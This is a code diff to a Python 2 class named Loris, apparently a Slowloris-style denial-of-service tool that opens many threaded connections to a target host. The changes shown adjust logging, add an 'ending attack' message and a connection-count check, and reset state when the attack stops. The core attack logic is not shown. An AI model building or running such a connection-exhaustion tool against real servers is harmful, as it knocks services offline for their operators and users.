@@ -33,8 +33,6 @@ class Loris:
         
         i = 0
         while i < self.totalConnections:
-            print "starting a thread for connections " +\
-            str(i) + " through " + str(i + self.connectionsPerThread)
             t = threading.Thread(target = self.doConnections)
             t.start()
             self.threadList.append(t)
@@ -44,7 +42,11 @@ class Loris:
     Call this to cancel the attack and free all connections
     """
     def endAttack(self):
+        print "ending attack..."
         self.end = True
+
+    def checkConnections(self):
+        print self.activeConnections
 
     """
     Determine the timeout to be used from this host to the
@@ -83,7 +85,10 @@ class Loris:
         sockets = [None]  * self.connectionsPerThread
         
         while (True):
-            if self.end:
+            if self.end is True:
+                self.activeConnections = 0
+                for sock in sockets:
+                    sock = None
             	return
             
             """ Establish connections """
@@ -125,5 +130,4 @@ class Loris:
                         working[i] = False
             
             """ Sleep for timeout """
-            print "Currently active connections: " + str(self.activeConnections)
             time.sleep(self.timeout)
